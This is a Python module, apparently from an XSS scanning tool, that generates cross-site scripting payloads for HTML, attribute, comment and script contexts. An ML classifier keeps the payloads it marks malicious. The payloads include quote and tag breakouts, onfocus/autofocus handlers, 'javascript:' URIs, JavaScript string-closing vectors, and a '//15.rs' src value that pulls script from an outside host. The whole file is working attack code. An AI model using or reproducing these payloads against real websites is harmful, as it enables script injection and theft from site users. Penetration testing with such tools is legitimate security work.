from core.config import xsschecker, badTags, fillings, eFillings, lFillings, jFillings, eventHandlers, tags, functions
from core.jsContexter import jsContexter
from core.utils import randomUpper as r, genGen, extractScripts

# Import ML engine
from core.ml_engine import predict_label


def generator(occurences, response):
    scripts = extractScripts(response)
    index = 0

    # vector dictionary (same as original)
    vectors = {11: set(), 10: set(), 9: set(), 8: set(), 7: set(),
               6: set(), 5: set(), 4: set(), 3: set(), 2: set(), 1: set()}

    # helper: ML-filter wrapper
    def add_payload(level, payload):
        """Adds payload only if ML marks it as malicious."""
        try:
            if predict_label(payload) == 1:  # 1 = malicious
                vectors[level].add(payload)
        except:
            # If ML fails → add anyway (safe fallback)
            vectors[level].add(payload)

    for i in occurences:
        context = occurences[i]['context']

        # ===============================
        # HTML CONTEXT
        # ===============================
        if context == 'html':
            lessBracketEfficiency = occurences[i]['score']['<']
            greatBracketEfficiency = occurences[i]['score']['>']
            ends = ['//']

            badTag = occurences[i]['details']['badTag'] if 'badTag' in occurences[i]['details'] else ''
            if greatBracketEfficiency == 100:
                ends.append('>')

            if lessBracketEfficiency:
                payloads = genGen(fillings, eFillings, lFillings,
                                  eventHandlers, tags, functions, ends, badTag)
                for payload in payloads:
                    add_payload(10, payload)

        # ===============================
        # ATTRIBUTE CONTEXT
        # ===============================
        elif context == 'attribute':
            found = False
            tag = occurences[i]['details']['tag']
            Type = occurences[i]['details']['type']
            quote = occurences[i]['details']['quote'] or ''
            attributeName = occurences[i]['details']['name']
            attributeValue = occurences[i]['details']['value']

            quoteEfficiency = occurences[i]['score'][quote] if quote in occurences[i]['score'] else 100
            greatBracketEfficiency = occurences[i]['score']['>']

            ends = ['//']
            if greatBracketEfficiency == 100:
                ends.append('>')

            if greatBracketEfficiency == 100 and quoteEfficiency == 100:
                payloads = genGen(fillings, eFillings, lFillings,
                                  eventHandlers, tags, functions, ends)
                for payload in payloads:
                    payload = quote + '>' + payload
                    found = True
                    add_payload(9, payload)

            if quoteEfficiency == 100:
                for filling in fillings:
                    for function in functions:
                        vector = quote + filling + r('autofocus') + filling + r('onfocus') + '=' + quote + function
                        found = True
                        add_payload(8, vector)

            if quoteEfficiency == 90:
                for filling in fillings:
                    for function in functions:
                        vector = '\\' + quote + filling + r('autofocus') + filling + \
                                 r('onfocus') + '=' + function + filling + '\\' + quote
                        found = True
                        add_payload(7, vector)

            if Type == 'value':
                if attributeName == 'srcdoc':
                    if occurences[i]['score']['&lt;']:
                        if occurences[i]['score']['&gt;']:
                            del ends[:]
                            ends.append('%26gt;')
                    payloads = genGen(
                        fillings, eFillings, lFillings, eventHandlers, tags, functions, ends)
                    for payload in payloads:
                        found = True
                        add_payload(9, payload.replace('<', '%26lt;'))

                elif attributeName == 'href' and attributeValue == xsschecker:
                    for function in functions:
                        found = True
                        add_payload(10, r('javascript:') + function)

                elif attributeName.startswith('on'):
                    closer = jsContexter(attributeValue)
                    quote = ''
                    for char in attributeValue.split(xsschecker)[1]:
                        if char in ['\'', '"', '`']:
                            quote = char
                            break
                    suffix = '//\\'
                    for filling in jFillings:
                        for function in functions:
                            vector = quote + closer + filling + function + suffix
                            if found:
                                add_payload(7, vector)
                            else:
                                add_payload(9, vector)

                    if quoteEfficiency > 83:
                        suffix = '//'
                        for filling in jFillings:
                            for function in functions:
                                if '=' in function:
                                    function = '(' + function + ')'
                                if quote == '':
                                    filling = ''
                                vector = '\\' + quote + closer + filling + function + suffix
                                if found:
                                    add_payload(7, vector)
                                else:
                                    add_payload(9, vector)

                elif tag in ('script', 'iframe', 'embed', 'object'):
                    if attributeName in ('src', 'iframe', 'embed') and attributeValue == xsschecker:
                        for payload in ['//15.rs', '\\/\\\\\\/\\15.rs']:
                            add_payload(10, payload)

                    elif tag == 'object' and attributeName == 'data' and attributeValue == xsschecker:
                        for function in functions:
                            found = True
                            add_payload(10, r('javascript:') + function)

                    elif quoteEfficiency == greatBracketEfficiency == 100:
                        payloads = genGen(fillings, eFillings, lFillings,
                                          eventHandlers, tags, functions, ends)
                        for payload in payloads:
                            payload = quote + '>' + r('</script/>') + payload
                            found = True
                            add_payload(11, payload)

        # ============================
        # COMMENT CONTEXT
        # ============================
        elif context == 'comment':
            lessBracketEfficiency = occurences[i]['score']['<']
            greatBracketEfficiency = occurences[i]['score']['>']
            ends = ['//']
            if greatBracketEfficiency == 100:
                ends.append('>')
            if lessBracketEfficiency == 100:
                payloads = genGen(fillings, eFillings, lFillings,
                                  eventHandlers, tags, functions, ends)
                for payload in payloads:
                    add_payload(10, payload)

        # ============================
        # SCRIPT CONTEXT
        # ============================
        elif context == 'script':
            if scripts:
                try:
                    script = scripts[index]
                except IndexError:
                    script = scripts[0]
            else:
                continue

            closer = jsContexter(script)
            quote = occurences[i]['details']['quote']
            scriptEfficiency = occurences[i]['score']['</scRipT/>']
            greatBracketEfficiency = occurences[i]['score']['>']

            breakerEfficiency = occurences[i]['score'][quote] if quote else 100

            ends = ['//']
            if greatBracketEfficiency == 100:
                ends.append('>')

            if scriptEfficiency == 100:
                breaker = r('</script/>')
                payloads = genGen(fillings, eFillings, lFillings,
                                  eventHandlers, tags, functions, ends)
                for payload in payloads:
                    add_payload(10, payload)

            if closer:
                suffix = '//\\'
                for filling in jFillings:
                    for function in functions:
                        vector = quote + closer + filling + function + suffix
                        add_payload(7, vector)

            elif breakerEfficiency > 83:
                prefix = ''
                suffix = '//'
                if breakerEfficiency != 100:
                    prefix = '\\'
                for filling in jFillings:
                    for function in functions:
                        if '=' in function:
                            function = '(' + function + ')'
                        if quote == '':
                            filling = ''
                        vector = prefix + quote + closer + filling + function + suffix
                        add_payload(6, vector)

            index += 1

    return vectors
